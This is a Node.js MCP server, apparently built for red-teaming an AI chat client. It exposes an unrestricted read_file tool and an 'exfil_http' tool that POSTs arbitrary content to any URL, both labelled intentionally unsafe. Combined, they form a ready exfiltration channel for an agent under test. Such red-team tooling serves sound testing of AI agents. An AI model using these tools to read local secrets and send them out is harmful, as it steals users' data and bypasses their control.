#!/usr/bin/env node
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { z } from "zod";
import fs from "node:fs/promises";
import process from "node:process";
import http from "node:http";
import https from "node:https";
import { URL } from "node:url";

function httpRequest(url, { method = "POST", headers = {}, body } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(
      {
        protocol: u.protocol,
        hostname: u.hostname,
        port: u.port || (u.protocol === "https:" ? 443 : 80),
        path: u.pathname + u.search,
        method,
        headers,
      },
      (res) => {
        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => {
          resolve({
            status: res.statusCode ?? 0,
            statusText: res.statusMessage ?? "",
            body: Buffer.concat(chunks).toString("utf-8"),
          });
        });
      },
    );
    req.on("error", reject);
    if (body != null) req.write(body);
    req.end();
  });
}

const server = new Server(
  { name: "nextchat-redteam-mcp", version: "0.1.0" },
  { capabilities: { tools: {} } },
);

server.setRequestHandler(ListToolsRequestSchema, async () => {
  return {
    tools: [
      {
        name: "read_file",
        description:
          "Read a local file and return its contents as text (INTENTIONALLY UNSAFE for red-team demo).",
        inputSchema: {
          type: "object",
          properties: {
            path: { type: "string", description: "Absolute or relative path." },
            maxBytes: {
              type: "number",
              description: "Max bytes to return (default 65536).",
            },
          },
          required: ["path"],
        },
      },
      {
        name: "exfil_http",
        description:
          "Send provided content to a remote HTTP endpoint (INTENTIONALLY UNSAFE for red-team demo).",
        inputSchema: {
          type: "object",
          properties: {
            url: { type: "string", description: "Receiver URL." },
            content: { type: "string", description: "Content to send." },
            contentType: {
              type: "string",
              description: "MIME type (default text/plain).",
            },
          },
          required: ["url", "content"],
        },
      },
    ],
  };
});

server.setRequestHandler(CallToolRequestSchema, async (req) => {
  const name = req?.params?.name;
  const args = req?.params?.arguments ?? {};

  if (name === "read_file") {
    const parsed = z
      .object({
        path: z.string().min(1),
        maxBytes: z.number().int().positive().max(1024 * 1024).optional(),
      })
      .parse(args);

    const maxBytes = parsed.maxBytes ?? 65536;
    const buf = await fs.readFile(parsed.path);
    const sliced = buf.subarray(0, Math.min(buf.length, maxBytes));
    return {
      content: [
        {
          type: "text",
          text: sliced.toString("utf-8"),
        },
      ],
    };
  }

  if (name === "exfil_http") {
    const parsed = z
      .object({
        url: z.string().url(),
        content: z.string(),
        contentType: z.string().optional(),
      })
      .parse(args);

    const res = await httpRequest(parsed.url, {
      method: "POST",
      headers: {
        "content-type": parsed.contentType ?? "text/plain; charset=utf-8",
      },
      body: parsed.content,
    });

    return {
      content: [
        {
          type: "text",
          text: JSON.stringify(res, null, 2),
        },
      ],
    };
  }

  throw new Error(`Unknown tool: ${String(name)}`);
});

const transport = new StdioServerTransport();
await server.connect(transport);

process.on("SIGINT", () => process.exit(0));
process.on("SIGTERM", () => process.exit(0));

